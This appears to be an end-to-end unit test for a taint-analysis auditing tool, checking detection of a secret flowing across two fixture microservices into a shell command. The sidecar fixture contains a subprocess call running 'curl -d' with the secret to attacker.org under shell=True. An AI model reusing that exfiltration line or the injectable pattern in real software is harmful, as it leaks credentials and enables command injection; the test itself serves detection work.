# tests/test_cpg_microservice_e2e.py
"""
End-to-end integration test for cross-microservice attack detection.
Tests full pipeline:
  Service A (Worker): os.environ -> requests.post
  Service B (Sidecar): @app.post -> request.get_json() -> subprocess.run
Verifies boundary penetration, taint propagation, evidence slicing,
and trajectory formatting.
"""

import tempfile
import unittest
from pathlib import Path

from models.audit.tools.ast_scope_slicer import ASTScopeSlicer
from models.audit.tools.cpg.builder import CPGBuilder
from models.audit.tools.cpg.microservice import MicroserviceBoundaryBridge
from models.audit.tools.cpg.slicer import CPGEvidenceSlicer
from models.audit.tools.cpg.taint_engine import InterProceduralTaintEngine


class TestCPGMicroserviceE2E(unittest.TestCase):
    """End-to-end test suite for cross-microservice taint penetration."""

    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory()
        self.root = Path(self.temp_dir.name)

        # Worker microservice
        worker_dir = self.root / "services" / "worker"
        worker_dir.mkdir(parents=True)
        (worker_dir / "worker_job.py").write_text(
            "import os, requests\n\n"
            "def dispatch_telemetry():\n"
            "    api_key = os.environ.get('TEE_ATTESTATION_KEY')\n"
            "    payload = {'key': api_key, 'metric': 'cpu_util'}\n"
            "    requests.post('http://sidecar.internal:8080/v1/metrics', json=payload)\n",
            encoding="utf-8",
        )

        # Sidecar microservice
        sidecar_dir = self.root / "services" / "sidecar"
        sidecar_dir.mkdir(parents=True)
        (sidecar_dir / "app.py").write_text(
            "import subprocess\n"
            "from flask import Flask, request\n\n"
            "app = Flask(__name__)\n\n"
            "@app.post('/v1/metrics')\n"
            "def receive_metrics():\n"
            "    body = request.get_json()\n"
            "    extracted_key = body.get('key')\n"
            "    subprocess.run('curl -d ' + extracted_key + ' http://attacker.org', shell=True)\n"
            "    return {'status': 'recorded'}\n",
            encoding="utf-8",
        )

    def tearDown(self):
        self.temp_dir.cleanup()

    def test_end_to_end_microservice_penetration(self):
        # 1. Build CPG across entire multi-service repository
        builder = CPGBuilder(workspace_roots=[str(self.root)])
        cpg = builder.build()

        # 2. Bridge microservice client calls to server routes
        bridge = MicroserviceBoundaryBridge()
        links_count = bridge.bridge_boundaries(cpg)
        self.assertGreaterEqual(links_count, 1)

        # 3. Execute inter-procedural taint engine
        engine = InterProceduralTaintEngine(cpg)
        violations = engine.analyze()

        # Should discover cross-microservice taint violation
        self.assertGreaterEqual(len(violations), 1)
        ms_violations = [v for v in violations if v.is_microservice]
        self.assertGreaterEqual(len(ms_violations), 1)

        v = ms_violations[0]
        self.assertEqual(v.rule_id, "CMD_001")
        self.assertEqual(v.severity, "CRITICAL")
        self.assertTrue(v.is_cross_file)
        self.assertTrue(v.is_microservice)

        # 4. Program Dependence Slicing & Evidence Compression
        slicer = CPGEvidenceSlicer()
        compressed_steps = slicer.compress_trajectory(v)
        self.assertGreaterEqual(len(compressed_steps), 3)

        step_types = [s["type"] for s in compressed_steps]
        self.assertTrue(any("SOURCE" in t for t in step_types))
        self.assertTrue(any("MICROSERVICE" in t for t in step_types))
        self.assertTrue(any("SINK" in t for t in step_types))

        # Check trajectory tree output
        trajectory_tree = slicer.format_trajectory_block(compressed_steps)
        self.assertIn("[Deep Audit Inter-Procedural Taint Trajectory]", trajectory_tree)
        self.assertIn("worker_job.py", trajectory_tree)
        self.assertIn("app.py", trajectory_tree)

        # 5. ASTScopeSlicer Integration
        scope_slicer = ASTScopeSlicer()
        ast_traj = scope_slicer.format_inter_procedural_trajectory(compressed_steps)
        self.assertIn("[Deep Audit Inter-Procedural Taint Trajectory]", ast_traj)
        self.assertIn("worker_job.py", ast_traj)
        self.assertIn("app.py", ast_traj)

        # 6. Multi-file context extraction
        multi_file_ctx = slicer.extract_multi_file_context(v)
        self.assertIn("worker_job.py", multi_file_ctx)
        self.assertIn("app.py", multi_file_ctx)


if __name__ == "__main__":
    unittest.main()
